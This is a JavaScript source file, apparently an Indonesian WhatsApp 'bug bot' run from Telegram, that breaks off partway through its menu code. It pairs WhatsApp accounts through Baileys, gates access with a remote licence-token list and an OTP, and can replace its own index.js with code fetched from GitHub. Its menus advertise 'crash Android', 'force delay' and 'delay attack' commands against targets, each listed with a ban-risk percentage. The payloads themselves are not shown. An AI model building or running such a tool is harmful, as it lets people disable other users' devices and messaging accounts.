/// ------ ( set const ) ------ \\\
const {
    default: makeWASocket,
    proto,
    DisconnectReason,
    useMultiFileAuthState,
    generateWAMessageFromContent,
    generateWAMessage,
    prepareWAMessageMedia,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys")
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const axios = require("axios");
const cheerio = require('cheerio');
const chalk = require("chalk"); 
const moment = require("moment");
const config = require("./config.js");
const { BOT_TOKEN, OWNER_ID } = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");

// === OTP Persistent Storage ===
const VERIFIED_FILE = path.join(__dirname, "STELLAR", "verified.json");
let verifiedUsers = new Set();

function loadVerifiedUsers() {
    try {
        if (fs.existsSync(VERIFIED_FILE)) {
            const data = JSON.parse(fs.readFileSync(VERIFIED_FILE));
            verifiedUsers = new Set(data);
            console.log(chalk.green(`✅ Loaded ${verifiedUsers.size} verified users`));
        }
    } catch (e) {
        console.error("Gagal load verified users:", e);
    }
}

function saveVerifiedUser(userId) {
    try {
        verifiedUsers.add(userId);
        fs.writeFileSync(VERIFIED_FILE, JSON.stringify([...verifiedUsers]));
    } catch (e) {
        console.error("Gagal simpan verified user:", e);
    }
}

loadVerifiedUsers();

////get video
const videoList = [
    "https://files.catbox.moe/n2k80t.mp4", 
];

const getRandomVideo = () => {
    return videoList[Math.floor(Math.random() * videoList.length)];
};

/// --- ( Variabel yang perlu didefinisikan ) --- \\\

/// --- ( Fungsi untuk mendapatkan kecepatan bot ) --- \\\
function getBotSpeed(startTime) {
    const diff = process.hrtime(startTime);
    return (diff[0] * 1e9 + diff[1]) / 1e6;
}

/// --- ( GitHub Raw ) --- \\\  
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/SonOfficial/Stel/main/Vevek.json";
const FILE_URL = 'https://raw.githubusercontent.com/SonOfficial/Password/main/akses.json';
const GITHUB_RAW = 'https://raw.githubusercontent.com/SonOfficial/Awak/main/index.js';
const GH_TOKEN = process.env.GH_TOKEN;

//════════ PULL UPDATE SOURCE
async function pullUpdate(bot, msg) {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId)) {
        return bot.sendMessage(chatId, 'Command Khusus Owner Lek');
    }

    try {
        const localFile = fs.readFileSync('./index.js', 'utf8');
        const localHash = crypto.createHash('sha256').update(localFile).digest('hex');

        const res = await fetch(GITHUB_RAW);
        if (!res.ok) {
            return bot.sendMessage(chatId, 'Tidak Menemukan File Index.js');
        }

        const remoteFile = await res.text();
        const remoteHash = crypto.createHash('sha256').update(remoteFile).digest('hex');

        if (localHash === remoteHash) {
            return bot.sendMessage(chatId, 'INDEX SUDAH VERSI TERBARU✅');
        }

        fs.writeFileSync('./index.backup.js', localFile);
        fs.writeFileSync('./index.js', remoteFile);

        await bot.sendMessage(chatId, 'Di Temukan Index.js✅\nRestart Bot');

        setTimeout(() => {
            process.exit(0);
        }, 1500);

    } catch (err) {
        console.log(err);
        bot.sendMessage(chatId, 'Update Gagal');
    }
}

// ================= TOKEN CHECK =================
async function fetchValidTokens() {
    try {
        const response = await axios.get(GITHUB_TOKEN_LIST_URL, { 
            timeout: 10000,
            headers: GH_TOKEN ? { Authorization: `token ${GH_TOKEN}` } : {}
        });

        if (Array.isArray(response.data)) {
            return response.data;
        }
        
        if (response.data && Array.isArray(response.data.tokens)) {
            return response.data.tokens;
        }
        
        return [];
        
    } catch (e) {
        return [];
    }
}

// ================= PASSWORD SOURCE =================
async function ambilTeksRepo() {
    try {
        const res = await axios.get(FILE_URL, {
            headers: GH_TOKEN ? { Authorization: `token ${GH_TOKEN}` } : {},
            timeout: 10000
        });

        if (!res.data.akses) {
            throw new Error('field "akses" tidak ada di response');
        }
        
        const otp = res.data.akses.trim();
        return otp;
        
    } catch (e) {
        console.error(chalk.red('[SECURITY] gagal ambil akses.json:'), e.message);
        process.exit(1);
    }
}

// ================= BOT TOKEN VALIDATION =================
async function validateToken() {
    console.log(chalk.blue.bold('🔍 VERIFIKASI TOKEN BOT\n'));
    
    if (!BOT_TOKEN || BOT_TOKEN.trim() === '') {
        console.error(chalk.red("❌ BOT_TOKEN tidak ada di config.js"));
        process.exit(1);
    }

    const validTokens = await fetchValidTokens();

    if (!validTokens.includes(BOT_TOKEN)) {
        console.log(chalk.red(`
         ⠀⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
         ⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
         ⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀         ⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
          ⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
           ⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
           ⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
           ⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
             ⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀            ⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀           ⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀           ⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀      ⠀     ⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀           ⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀           ⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀            ⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        `));
        console.log(chalk.red(`ADD TOKEN DULU NGABB`));
        process.exit(1);
    }

    console.log(chalk.green.bold('✅ TOKEN TERDAFTAR'));
}

// ================= BOT START =================
function startBot() {
    console.log(chalk.red(`
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⠀⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢻⡟⢠⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⣸⡏⡼⢁⣾⣿⡇⠀⢀⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⣼⡀⠀⠀⠀⠀⢀⣴⢏⠔⣥⣿⢿⣿⠁⣠⣾⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⠟⠀⠀⣀⣤⠶⢋⣡⡶⠿⠋⠥⣛⣥⣾⠿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣟⣿⡟⢿⣄⢙⣿⣷⠟⠋⠉⣀⣒⣛⣛⣋⣉⣀⡴⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⠿⠋⠀⣸⣿⣾⡟⣀⣴⠾⠛⠛⠛⣛⣿⣿⡿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠁⠀⠀⣰⣿⣿⡟⡴⠋⣀⣀⡐⠲⠾⠛⠛⡉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⠎⠀⢊⣁⠨⣝⣶⣤⣤⡾⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡏⢠⠞⠉⠙⢿⡌⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠨⠲⢦⢰⣼⣷⣤⠔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣇⢹⡆⡀⣾⡇⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠺⠡⣿⡘⠛⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣉⠁⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣾⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣼⣿⡇⢹⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠉⢩⣿⣿⠁⢨⣿⡇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣶⣿⢟⠃⢀⣾⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠞⠛⠉⠉⢉⡅⠂⣿⢠⡿⠋⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠠⠃⠀⠀⠀⢰⣿⣤⣾⡏⢸⢁⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡟⠉⠀⠸⢸⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠀⢀⣸⠿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠘⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠘⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀
    `));
    
    console.log(chalk.blue(`
█▀ ▀█▀ █▀▀ █░ █░ ▄▀█ █▀█
▄█ ░█░ ██▄ █▄ █▄ █▀█ █▀▄

░█▀ █▀▀ █▀ █░█ █▀█ █ ▀█▀ █▄█
░▄█ ██▄ █▄ █▄█ █▀▄ █ ░█░ ░█░
    `));

    console.log(chalk.yellow.bold(`
┌──────────────────────────┐
│  INFORMATION SCRIPT
├──────────────────────────┤
│ NAME SCRIPT: Kairn Base
│ VERSION : 2.8.0
│ STATUS : BOT RUNNING
└──────────────────────────┘
    `));
}

// ================= MAIN GATE =================
async function main() {
    await validateToken();
    startBot();
    initializeWhatsAppConnections();
}

main();

// --------------- ( Save Session & Installasion WhatsApp ) ------------------- \\

let sock; // Global sock untuk kompatibilitas

function saveActiveSessions(botNumber) {
    try {
        const sessionsList = [];
        if (fs.existsSync(SESSIONS_FILE)) {
            const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            if (!existing.includes(botNumber)) {
                sessionsList.push(...existing, botNumber);
            } else {
                sessionsList.push(...existing);
            }
        } else {
            sessionsList.push(botNumber);
        }
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsList));
    } catch (error) {
        console.error("Error saving session:", error);
    }
}

async function initializeWhatsAppConnections() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
            console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

            for (const botNumber of activeNumbers) {
                console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
                const sessionDir = createSessionDir(botNumber);
                const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

                const sockInstance = makeWASocket({
                    auth: state,
                    printQRInTerminal: true,
                    logger: P({ level: "silent" }),
                    defaultQueryTimeoutMs: undefined,
                });

                await new Promise((resolve, reject) => {
                    sockInstance.ev.on("connection.update", async (update) => {
                        const { connection, lastDisconnect } = update;
                        if (connection === "open") {
                            console.log(`Bot ${botNumber} terhubung!`);
                            sessions.set(botNumber, sockInstance);
                            sock = sockInstance; // Update global sock
                            resolve();
                        } else if (connection === "close") {
                            const shouldReconnect =
                                lastDisconnect?.error?.output?.statusCode !==
                                DisconnectReason.loggedOut;
                            if (shouldReconnect) {
                                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                                await initializeWhatsAppConnections();
                            } else {
                                reject(new Error("Koneksi ditutup"));
                            }
                        }
                    });

                    sockInstance.ev.on("creds.update", saveCreds);
                });
            }
        }
    } catch (error) {
        console.error("Error initializing WhatsApp connections:", error);
    }
}

function createSessionDir(botNumber) {
    const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    if (!fs.existsSync(deviceDir)) {
        fs.mkdirSync(deviceDir, { recursive: true });
    }
    return deviceDir;
}

//// --- ( Instalasi WhatsApp ) --- \\\
async function connectToWhatsApp(botNumber, chatId) {
    let statusMessage = await bot
        .sendMessage(
            chatId,
            `
<blockquote>┌─────────────────────────┐
│  MENYIAPKAN CODE PAIRING
├─────────────────────────┤
│ Nomor : ${botNumber}
└─────────────────────────┘</blockquote>
`,
            { parse_mode: "HTML" }
        )
        .then((msg) => msg.message_id);

    const sessionDir = createSessionDir(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sockInstance = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: P({ level: "silent" }),
        defaultQueryTimeoutMs: undefined,
    });

    let pairingCodeRequested = false; // Flag untuk menghindari permintaan berulang

    sockInstance.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === "close") {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            if (statusCode && statusCode >= 500 && statusCode < 600) {
                await bot.editMessageText(
                    `
<blockquote>┌─────────────────────────┐
│ Memproses Connection
├─────────────────────────┤
│ Nomor : ${botNumber}
│ Status : Proses 🔄.
└─────────────────────────┘</blockquote>
`,
                    {
                        chat_id: chatId,
                        message_id: statusMessage,
                        parse_mode: "HTML",
                    }
                );
                await connectToWhatsApp(botNumber, chatId);
            } else {
                await bot.editMessageText(
                    `
<blockquote>┌─────────────────────────┐
│ Connection Gagal
├─────────────────────────┤
│ Nomor : ${botNumber}
│ Status :  Gagal ❌
└─────────────────────────┘</blockquote>
`,
                    {
                        chat_id: chatId,
                        message_id: statusMessage,
                        parse_mode: "HTML",
                    }
                );
                try {
                    fs.rmSync(sessionDir, { recursive: true, force: true });
                } catch (error) {
                    console.error("Error deleting session:", error);
                }
            }
        } else if (connection === "open") {
            sessions.set(botNumber, sockInstance);
            sock = sockInstance; // Update global sock
            saveActiveSessions(botNumber);
            await bot.editMessageText(
                `
<blockquote>┌─────────────────────────┐
│ Connection Sukses
├─────────────────────────┤
│ Nomor : ${botNumber}
│ Status : Sukses Connect.✅
└─────────────────────────┘</blockquote>
`,
                {
                    chat_id: chatId,
                    message_id: statusMessage,
                    parse_mode: "HTML",
                }
            );
        } else if (connection === "connecting") {
            // Hanya minta pairing code sekali dan jika file creds belum ada
            if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeRequested) {
                pairingCodeRequested = true;
                try {
                    // Gunakan custom code "SONKAIRN"
                    const code = await sockInstance.requestPairingCode(botNumber, "SONKAIRN");
                    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

                    await bot.editMessageText(
                        `
<blockquote>┌─────────────────────────┐
│ YOUR CODE PAIRING
├─────────────────────────┤
│ Nomor : ${botNumber}
│ Kode  : <code>${formattedCode}</code>
│ (Custom: SONKAIRN)
└─────────────────────────┘
⏳ *Tunggu proses pairing...* (Jangan close chat ini)
`,
                        {
                            chat_id: chatId,
                            message_id: statusMessage,
                            parse_mode: "HTML",
                        }
                    );
                } catch (error) {
                    console.error("Error requesting pairing code:", error);
                    await bot.editMessageText(
                        `
<blockquote>┌─────────────────────────┐
│ STATUS │ Sedang Pairing
├─────────────────────────┤
│ Nomor : ${botNumber}
│ Kode  : ${error.message} Error⚠️
└─────────────────────────┘</blockquote>
`,
                        {
                            chat_id: chatId,
                            message_id: statusMessage,
                            parse_mode: "HTML",
                        }
                    );
                }
            }
        }
    });

    sockInstance.ev.on("creds.update", saveCreds);

    return sockInstance;
}

// ---------- ( Read File And Save Premium - ceo - Owner ) ----------- \\
const STELLAR_DIR = path.join(__dirname, "STELLAR");
if (!fs.existsSync(STELLAR_DIR)) {
    fs.mkdirSync(STELLAR_DIR, { recursive: true });
}

let premiumUsers = [];
let ceoUsers = [];

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./STELLAR/premium.json', []);
ensureFileExists('./STELLAR/ceo.json', []);

function loadPremiumUsers() {
    try {
        premiumUsers = JSON.parse(fs.readFileSync('./STELLAR/premium.json'));
    } catch (error) {
        premiumUsers = [];
        console.error("Error loading premium users:", error);
    }
}

function loadCeoUsers() {
    try {
        ceoUsers = JSON.parse(fs.readFileSync('./STELLAR/ceo.json'));
    } catch (error) {
        ceoUsers = [];
        console.error("Error loading ceo users:", error);
    }
}

function savePremiumUsers() {
    fs.writeFileSync('./STELLAR/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveceoUsers() {
    fs.writeFileSync('./STELLAR/ceo.json', JSON.stringify(ceoUsers, null, 2));
}

// Load data saat startup
loadPremiumUsers();
loadCeoUsers();

function isOwner(userId) {
    return config.OWNER_ID.includes(userId.toString());
}

// ------------ ( Function Plugins ) ------------- \\
function formatRuntime(seconds) {
    const days = Math.floor(seconds / (3600 * 24));
    const hours = Math.floor((seconds % (3600 * 24)) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;  
    return `${hours}h, ${minutes}m, ${secs}s`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
    const now = Math.floor(Date.now() / 1000);
    return formatRuntime(now - startTime);
}

function getCurrentDate() {
    const now = new Date();
    const options = { 
        weekday: "long", 
        year: "numeric", 
        month: "long", 
        day: "numeric" 
    };
    return now.toLocaleDateString("id-ID", options);
}

/// --- ( Menu Utama ) --- \\\
const bugRequests = {};
const buttonSessions = new Map();

////gerbang start
bot.onText(/\/start/, async (msg) => {
    if (!msg || !msg.chat) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = msg.from.username
        ? `@${msg.from.username}`
        : msg.from.first_name || "User";

    // Cek apakah user sudah terverifikasi
    if (!verifiedUsers.has(userId)) {
        const randomVideo = getRandomVideo();

        return bot.sendVideo(chatId, randomVideo, {
            supports_streaming: true,
            caption: `
 <blockquote>◌═──▻ ⦗ 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞⦘ ◅──═◌ </blockquote>
( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
開発者が用意した機能を楽しんでください。
何か提案があれば、作者に直接連絡しても大丈夫です。

silakan masukkan otp untuk melanjutkan akses.
`,
            parse_mode: "HTML",
        });
    }

    // SUDAH OTP → LANGSUNG MENU
    return showStartMenu(chatId, msg);
});

////handler otp
bot.on('message', async (msg) => {
    if (!msg.text || msg.text.startsWith('/')) return;

    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text.trim();

    if (verifiedUsers.has(userId)) return;

    try {
        const otpBenar = await ambilTeksRepo();

        if (text === otpBenar) {
            saveVerifiedUser(userId); // Simpan permanen
            await bot.sendMessage(chatId, '✅ OTP benar, akses dibuka!');
            return showStartMenu(chatId, msg);
        } else {
            // Hanya peringatan, tidak menghentikan bot
            await bot.sendMessage(chatId, '❌ OTP salah. Silakan coba lagi.');
        }
    } catch (e) {
        console.error('otp error:', e.message);
        await bot.sendMessage(chatId, '❌ Terjadi kesalahan sistem.');
    }
});

// Func Start
async function showStartMenu(chatId, msg) {
    const username = msg.from.username
        ? `@${msg.from.username}`
        : msg.from.first_name || "User";
    const userId = msg.from.id;
    const isUserPremium = premiumUsers.some(user => 
        user.id === userId && new Date(user.expiresAt) > new Date()
    );
    const premiumStatus = isUserPremium ? "✅ Premium" : "❌ Regular";
        
    const randomVideo = getRandomVideo();

    await bot.sendVideo(chatId, randomVideo, {
        supports_streaming: true,
        caption: `
( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
開発者が用意した機能を楽しんでください。
何か提案があれば、作者に直接連絡しても大丈夫です。
<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖲𝖼𝗋𝗂𝗉𝗍 ⦘ ◅──═◌</blockquote>
⎋ 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 & 𝖪𝖺𝗂𝗋𝗇 𝖳𝖾𝖺𝗆
⎋ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 𝟤.𝟫.𝟢
⎋ 𝖡𝖺𝗁𝖺𝗌𝖺 : 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
⎋ 𝖯𝗋𝖾𝖿𝗂𝗑 : /
───────────────────────
<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖴𝗌𝖾𝗋 ◅──═◌ </blockquote>
⎋ 𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾 : ${username}
⎋ 𝖲𝗍𝖺𝗍𝗎𝗌 : ${premiumStatus}
`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "メニューを表示", callback_data: "mainmenu" }],
            ],
        },
    });
}

bot.on("callback_query", async (callbackQuery) => {
    try {
        const chatId = callbackQuery.message.chat.id;
        const messageId = callbackQuery.message.message_id;
        const data = callbackQuery.data;
        const randomVideo = getRandomVideo();
        const senderId = callbackQuery.from.id;
        
        const isUserPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
        const premiumStatus = isUserPremium ? "Yes" : "No";
        
        const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : "Tidak ada username";
        const date = getCurrentDate();

        let newCaption = "";
        let newButtons = [];

        if (data === "bugshow") {
            newCaption = `
( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
開発者が用意した機能を楽しんでください。
何か提案があれば、作者に直接連絡しても大丈夫です。
<blockquote>◌═──▻ ⦗ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 - 𝖲𝖼𝗋𝗂𝗉𝗍 ⦘ ◅──═◌</blockquote>
⎋ 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : 𝖲𝗈𝗇𝖪𝖺𝗂𝗋𝗇 & 𝖪𝖺𝗂𝗋𝗇 𝖳𝖾𝖺𝗆
⎋ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 𝟤.𝟫.𝟢
⎋ 𝖡𝖺𝗁𝖺𝗌𝖺 : 𝖩𝖺𝗏𝖺𝗌𝖼𝗋𝗂𝗉𝗍
⎋ 𝖯𝗋𝖾𝖿𝗂𝗑 : /
            `;
            newButtons = [
                [
                    { text: "𝖥𝖮𝖱𝖢𝖤 𝖣𝖤𝖫𝖠𝖸", callback_data: "force" }, 
                ], 
                [
                    { text: "BLANK 𝖠𝖭𝖣𝖱𝖮", callback_data: "crash" }, 
                    { text: "𝖣𝖤𝖫𝖠𝖸 𝖠𝖳𝖳𝖠𝖢𝖪", callback_data: "delay" }, 
                ], 
                [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
                [{ text: "𝟧𝟣𝟥", url: "https://t.me/StellarNecrosis" }],
            ];
        } else if (data === "crash") {
            newCaption = `
( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
開発者が用意した機能を楽しんでください。
何か提案があれば、作者に直接連絡しても大丈夫です。
<blockquote>◌═──▻ ⦗ 𝖢𝗋𝖺𝗌𝗁 - 𝖠𝗇𝖽𝗋𝗈𝗂𝖽 ⦘ ◅──═◌</blockquote>
/loki - Rasio Ban 25%
/apollo - Rasio Ban 40%
            `;
            newButtons = [
                [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
                [{ text: "𝟧𝟣𝟥", url: "https://t.me/StellarNecrosis" }],
            ];
        } else if (data === "force") {
            newCaption = `
( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
開発者が用意した機能を楽しんでください。
何か提案があれば、作者に直接連絡しても大丈夫です。
<blockquote>◌═──▻ ⦗ 𝖥𝗈𝗋𝖼𝖾 - Delay⦘ ◅──═◌</blockquote>
/𝗓𝗂𝗇𝖼𝗒 - Rasio Ban 23%
/offen - Rasio Ban 40%
            `;
            newButtons = [
                [{ text: "(🔙) 戻る", callback_data: "mainmenu" }], 
                [{ text: "𝟧𝟣𝟥", url: "https://t.me/StellarNecrosis" }],
            ];
        } else if (data === "delay") {
            newCaption = `
( 🍀 )  𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝗼𝘁 ──さん、ようこそ。
開発者が用意した機能を楽しんでください。
何か提案があれば、作者に直接連絡しても大丈夫です。
<blockquote>◌═──▻ ⦗ 𝖣𝖾𝗅𝖺𝗒 - 𝖠𝗍𝗍𝖺𝖼𝗄 ⦘ ◅──═◌</blockquote>
/sparta - Rasio Ban 15%
/troya - Rasio Ban 37%
/ladelay - Rasio Ban 32%
